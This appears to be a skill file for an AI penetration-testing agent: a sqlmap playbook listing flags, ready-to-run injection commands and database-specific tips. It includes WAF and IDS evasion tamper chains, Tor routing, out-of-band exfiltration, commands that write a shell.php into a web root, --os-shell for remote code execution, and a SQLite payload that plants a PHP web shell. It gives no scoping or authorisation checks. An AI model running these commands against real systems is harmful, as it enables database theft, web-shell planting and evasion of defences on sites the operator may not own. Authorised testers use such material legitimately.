---
name: sqlmap
description: sqlmap CLI playbook covering detection, fingerprinting, time/error/union/stacked techniques, tamper scripts, WAF bypass, and database-specific exploitation
---

# sqlmap Playbook

Official docs:
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- https://github.com/sqlmapproject/sqlmap

Canonical syntax:
`sqlmap [options] {target URL}`

## High-Signal Flags

**Target**
- `-u <url>` single target (include query string)
- `-r <request_file>` raw HTTP request file (from an intercepting proxy)
- `-l <burp_log>` parse Burp proxy log
- `-m <targets_file>` multiple targets
- `-c <sqlmap.conf>` config file
- `--data "<post_body>"` POST body
- `--cookie "<cookies>"` custom cookies
- `--headers "<header: value>"` custom headers
- `--method GET|POST|...` HTTP method

**Request shaping**
- `-p <param>` parameter to test (skip heuristic, focus on specific)
- `--param-exclude=<regex>` exclude parameters
- `--skip=<param>` skip parameter
- `--dbms=<db>` force DBMS (mysql, pgsql, mssql, oracle, sqlite)
- `--os=<os>` force OS (linux, windows)
- `--prefix=<str>` / `--suffix=<str>` prefix/suffix for injection
- `--tamper=<script1,script2>` tamper scripts

**Detection**
- `--level=1..5` test level (1=basic, 5=full + User-Agent/Referer/Cookie)
- `--risk=1..3` risk level (1=safe, 3=heavy OR/UNION/UNION stacked)
- `--technique=<BEUSTQ>` technique(s) to use:
  - `B` boolean-based blind
  - `E` error-based
  - `U` union query-based
  - `S` stacked queries (file write, multi-statement)
  - `T` time-based blind
  - `Q` inline queries
- `--string=<str>` string to match for true responses
- `--not-string=<str>` string to match for false responses
- `--regexp=<regex>` regex to match for true responses
- `--code=<code>` HTTP code for true responses
- `--text-only` compare only text body (ignore headers)

**Fingerprinting**
- `-f` / `--fingerprint` extensive DBMS fingerprint
- `-b` / `--banner` retrieve DBMS banner
- `--current-user` / `--current-db` / `--hostname`
- `--is-dba` check if current user is DBA
- `--users` / `--passwords` / `--privileges` / `--roles`

**Enumeration**
- `--dbs` enumerate databases
- `--tables` enumerate tables (use `-D <db>`)
- `--columns` enumerate columns (use `-T <table>`)
- `--dump` dump table contents
- `--dump-all` dump everything (careful — slow and noisy)
- `-D <db>` `-T <table>` `-C <cols>` scope
- `--start=<n>` `--stop=<n>` row range
- `--where=<sql>` WHERE clause
- `--search` search for column/table names
- `--exclude-sysdbs` exclude system DBs

**File system / OS access**
- `--file-read=<path>` read a file (MySQL LOAD_FILE / MSSQL OPENROWSET)
- `--file-write=<path>` write a file (MySQL INTO OUTFILE)
- `--os-cmd=<cmd>` execute OS command (requires stacked queries + writable dir)
- `--os-shell` prompt for interactive OS shell
- `--os-pwn` out-of-band shell via Meterpreter (requires `--os-smbrelay` or similar)
- `--reg-read` / `--reg-add` Windows registry (MSSQL)

**Out-of-band**
- `--oob` use OOB techniques (e.g., DNS via sqlmap's collaborator or `--dns-domain`)
- `--dns-domain=<domain>` DNS domain for OOB
- --check-internet check outbound connectivity before OOB

**Performance / stealth**
- `--timeout=<sec>` request timeout
- `--retries=<n>` retries
- `--delay=<sec>` delay between requests
- `--time-sec=<sec>` time-based blind delay (default 5)
- `--threads=<n>` concurrent requests
- `--randomize=<params>` randomize parameter values
- `--safe-url=<url>` safe URL to hit between requests (reduce IDS signal)
- `--safe-freq=<n>` safe request frequency
- `--chunked` use HTTP chunked transfer encoding (bypass some WAFs)

**Output**
- `-o <dir>` output directory (default `.sqlmap/output/<host>`)
- `--output-dir=<dir>` explicit output dir
- `--flush-session` flush session for target (re-test)
- `--fresh-queries` ignore stored query results
- `--save` save command line to conf file

## Common Patterns

**Basic detection on a single parameter:**
```
sqlmap -u "http://target.com/page?id=1" --batch --level=3 --risk=2
```

**Detection on a POST form (use a raw request captured by the proxy):**
```
sqlmap -r request.txt -p "username" --batch
```

**Targeted UNION exploitation (faster, more reliable when UNION works):**
```
sqlmap -u "http://target.com/page?id=1" --technique=U --union-cols=5-10 --batch
```

**Time-based blind (when UNION/ERROR are blocked):**
```
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=10 --batch
```

**Stacked queries (file write / OS shell on MySQL):**
```
sqlmap -u "http://target.com/page?id=1" --technique=S --file-write=/local/shell.php --file-dest=/var/www/html/shell.php --batch
```

**Authenticated scan (preserve cookies):**
```
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123; csrf=xyz" --batch
```

**WAF-evasion tamper chains (Cloudflare, ModSecurity, AWS WAF):**
```
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase,percentage \
  --random-agent --hpp --batch

# When behind Cloudflare specifically:
sqlmap -u "http://target.com/page?id=1" \
  --tamper=between,charencode,space2comment,randomcase \
  --random-agent --hpp --delay=1 --timeout=60 --retries=3 \
  --skip-urlencode --batch
```

**JSON body testing:**
```
sqlmap -u "http://target.com/api/login" --method=POST \
  --data='{"username":"admin","password":"test"}' \
  -p "username" --batch
```

**Header injection (test for User-Agent / Referer / Cookie SQLi):**
```
sqlmap -u "http://target.com/page" --level=5 --risk=3 --batch
```

**Speed tuning for high-RTT targets:**
```
sqlmap -u "http://target.com/page?id=1" \
  --timeout=60 --retries=2 --delay=0.5 --time-sec=15 \
  --keep-alive --threads=4 --batch
```

**Multi-DB / multi-vendor (try every DBMS):**
```
sqlmap -u "http://target.com/page?id=1" --dbms=MySQL --batch
# Then
sqlmap -u "http://target.com/page?id=1" --dbms=PostgreSQL --batch
# Then
sqlmap -u "http://target.com/page?id=1" --dbms=Microsoft SQL Server --batch
```

**OS shell (full RCE on MySQL/MSSQL):**
```
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
# Drops a webshell or invokes xp_cmdshell, depending on DB
```

## Tamper Script Reference (Most Useful)

| Tamper | Effect | Use case |
|---|---|---|
| `space2comment` | spaces → `/**/` | MySQL/MSSQL, filter on space |
| `space2plus` | space → `+` | generic |
| `space2hash` | space → `#\n` | MySQL |
| `between` | `>` → `NOT BETWEEN 0 AND` | numeric filters |
| `randomcase` | random case | keyword filters |
| `percentage` | `%` before each char | ASP/Unicode filters |
| `charencode` | URL-encode | generic |
| `chardoubleencode` | double URL-encode | generic |
| `unionalltounion` | `UNION ALL` → `UNION` | keyword filter on `ALL` |
| `equaltolike` | `=` → `LIKE` | weak filters |
| `base64encode` | base64-encode payload | WAF on raw SQL |
| `modsecurityversioned` | spaces + MySQL versioned comments | ModSecurity |
| `symboliclogical` | `AND` → `&&`, `OR` → `||` | WAF on SQL keywords |
| `halfversionedmorekeywords` | spaces + MySQL /*! ... */ | MySQL keyword filter |
| `informationschemacomment` | spaces + MySQL comment-style | MySQL |
| `appendnullbyte` | append `%00` | ASP/legacy |
| `htmlencode` | HTML-encode | HTML form context |
| `lowercase` | lowercase | keyword case filter |
| `uppercase` | uppercase | keyword case filter |
| `versionedkeywords` | wrap keywords in MySQL `/*!...*/` | MySQL keyword filter |
| `xforwardedfor` | inject `X-Forwarded-For: *` | bypass IP-based rate limits |
| `overlongutf8` | overlong UTF-8 encoding | IIS / older ASP |

Combine 3-5 tampers max — more is slower and more likely to corrupt payloads.

## Database-Specific Tips

**MySQL**
- `INTO OUTFILE` for file write (needs `FILE` privilege + writable dir + `secure_file_priv` empty)
- `LOAD_FILE('/var/www/html/config.php')` reads files
- UNION queries work with up to ~10 columns, but most apps use 3-5
- `--dbms=MySQL` + `--technique=S` for stacked queries

**PostgreSQL**
- `COPY ... TO` for file write (superuser only)
- `pg_read_file()` to read files
- UNION works well
- Time-based: `pg_sleep(5)`
- Stacked queries often disabled via libpq default

**MSSQL**
- `xp_cmdshell` for OS commands (DBA)
- `OPENROWSET(BULK 'c:\inetpub\wwwroot\web.config', SINGLE_CLOB)` for file read
- `BULK INSERT` for file write
- `WAITFOR DELAY '0:0:5'` for time-based
- `--dbms=mssql` + `--os-shell` = xp_cmdshell shell

**Oracle**
- `UTL_HTTP` for outbound (SSRF)
- `DBMS_PIPE` for command execution chains
- Time-based: `DBMS_PIPE.RECEIVE_MESSAGE('x', 5)`
- Harder than MySQL/MSSQL — often requires stacked queries
- `--dbms=Oracle` is usually required

**SQLite**
- File-based, often no privilege model
- `ATTACH DATABASE '/var/www/html/shell.php' AS shell` then `CREATE TABLE shell.x (y TEXT); INSERT INTO shell.x VALUES ('<?php system($_GET[c])?>');` for file write
- Limited time-based: `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`

## Critical Correctness Rules

- **Always start with `--batch`** in non-interactive scans (auto-pick defaults)
- **`--level=3 --risk=2`** is the safe-but-thorough starting point
- **Save raw requests** with `-r` instead of `-u` for POST forms and authenticated requests
- **Never run `--os-shell` first** — confirm injection with read-only techniques first
- **Use `--threads` carefully** — too high trips IDS, too low is slow
- **Watch for WAF blocks** — switch to time-based blind with tamper if blocked
- **Use the proxy tools for inspection** — `repeat_request` mutated bodies to test different sqlmap payloads
- **Confirm findings** — sqlmap can have false positives; verify with a manual `UNION SELECT` or time-based payload

## Failure Recovery

**No injection found but you suspect SQLi:**
- Bump `--level=5 --risk=3` (test headers, cookies, second-order)
- Add more tampers
- Try different DBMS with `--dbms=`
- Try `--prefix` / `--suffix` if injection is inside a larger query
- Check for second-order: payload stored, executed in admin context later

**Time-based seems to work but no data exfiltrated:**
- Increase `--time-sec`
- Switch to boolean-based if time-based is unreliable (network jitter)
- Use OOB techniques (`--oob --dns-domain=...`) for blind scenarios

**WAF blocks after a few requests:**
- Add `--delay=1 --randomize=id`
- Switch to `--technique=T` (time-based) which is stealthier
- Try `--chunked` (HTTP chunked encoding)
- Use `--tor` / `--tor-port` / `--tor-type=SOCKS5` with `--check-tor`

**`--os-shell` fails on MySQL:**
- Confirm `secure_file_priv` is empty: `SELECT @@secure_file_priv`
- Confirm `FILE` privilege: `SELECT FILE_PRIV FROM mysql.user`
- Confirm writable webroot (often `/var/www/html` on Apache)
- Try stacked queries explicitly with `--technique=S`

**Session resumption:**
- sqlmap caches findings in `.sqlmap/output/<host>/`
- Use `--flush-session` to re-test
- Use `--fresh-queries` to re-execute

## When sqlmap Isn't Enough

- **OOB-only targets** (blind, no timing signal) — use `interactsh` skill
- **Complex WAF** (Akamai, Cloudflare with custom rules) — manual payloads with the `web_search` tool
- **Stored XSS in error messages** — switch to manual `UNION SELECT '<script>...</script>'`
- **GraphQL endpoints** — use `graphql` skill instead; sqlmap doesn't handle nested fields
- **NoSQL (MongoDB, CouchDB)** — use `nosql_injection` skill
- **LDAP / XPath / Cassandra / etc.** — sqlmap has limited support; manual testing via custom Python

## Tool Composition

sqlmap works best as part of a larger workflow:

1. **mitmproxy** for capturing the original request
2. **sqlmap** for automated detection
3. **Custom Python scripts** for complex extraction (when sqlmap's `--dump` is too slow or noisy)
4. **interactsh** for OOB confirmation of blind injection (when no direct output)
5. **Nuclei** for known-CVE SQLi templates (when you know the version)

If uncertain, query `web_search` with:
`"sqlmap" "<dbms>" "<tamper>" "<bypass>" 2025`
